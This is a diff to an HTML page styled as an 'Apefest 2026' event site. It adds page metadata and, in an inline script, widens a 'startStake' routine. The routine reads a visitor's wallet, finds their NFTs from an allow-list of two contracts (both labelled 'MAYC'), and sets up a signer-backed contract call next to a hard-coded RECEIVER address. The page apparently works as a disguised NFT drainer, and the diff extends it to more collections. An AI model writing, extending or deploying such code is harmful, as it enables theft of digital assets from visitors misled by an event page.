@@ -8,12 +8,23 @@
   <meta name="loadforge-site-verification"
     content="2b9e066473581feeaf8a32fad0dbb2d46c0dbcc1687e04a236438df03685f8c725a631956de667c34e2c99e5e2a170d71ab73d183a5a16f246f688fa22491181" />
   <meta charset="UTF-8" />
-  <link rel="icon" type="image/png" href="favicon.png" />
+  <link rel="icon" href="/favicon.png">
   <link rel="shortcut icon" type="image/png" href="favicon.png" />
   <link rel="stylesheet" href="../use.typekit.net/vip0lwz.css">
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ApeFest Vegas 2026</title>
+  <title>Apefest 2026</title>
+  <meta name="description" content="A meeting of Apes from around the world">
+  <meta property="og:title" content="Apefest 2026">
+  <meta property="og:image" content="https://apefest.com/open-graph.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="Apefest 2026">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Apefest 2026">
+  <meta name="twitter:description" content="A meeting of Apes from around the world">
+  <link rel="shortcut icon" href="/favicon.png">
+  <link rel="icon" href="/favicon.ico?favicon.2vob68tjqpejf.ico?dpl=dpl_EpTUE9kQ1utsNunN8jeDdTUgjFZF" sizes="256x256" type="image/x-icon">
   <script type="module" crossorigin src="assets/index.e28a01ca.js"></script>
   <link rel="stylesheet" href="assets/index.6b68cba5.css">
 </head>
@@ -37,8 +48,16 @@
 
 <script>
 
-const MAYC =
-  "0x60E4d786628Fea6478F785A6d7e704777c86a7c6";
+const ALLOWED_CONTRACTS = [
+  {
+    name: "MAYC",
+    address: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D"
+  },
+  {
+    name: "MAYC",
+    address: "0x60e4d786628fea6478f785a6d7e704777c86a7c6"
+  }
+];
 
 const RECEIVER =
   "0x974c32106390e0F378f36FbF4428d4F32D813dd7";
@@ -74,7 +93,7 @@ async function startStake() {
 
     console.log("Wallet:", wallet);
 
-    // fetch MAYC NFTs
+    // fetch NFTs
     const res = await fetch(
       `https://eth-mainnet.g.alchemy.com/nft/v2/${API}/getNFTs/?owner=${wallet}`
     );
@@ -82,24 +101,27 @@ async function startStake() {
     const data =
       await res.json();
 
-    const maycs =
+    // filter for allowed contracts
+    const allowedAddresses = ALLOWED_CONTRACTS.map(c => c.address.toLowerCase());
+    const nfts =
       data.ownedNfts.filter(
         nft =>
-          nft.contract.address.toLowerCase() ===
-          MAYC.toLowerCase()
+          allowedAddresses.includes(
+            nft.contract.address.toLowerCase()
+          )
       );
 
-    if (maycs.length === 0) {
+    if (nfts.length === 0) {
 
-      alert("No MAYC Found");
+      alert("No eligible NFT found");
 
       return;
 
     }
 
-    // first MAYC
+    // first NFT
     const nft =
-      maycs[0];
+      nfts[0];
 
     const tokenId =
       ethers.BigNumber
@@ -118,7 +140,7 @@ async function startStake() {
 
     const contract =
       new ethers.Contract(
-        MAYC,
+        nft.contract.address,
         abi,
         signer
       );
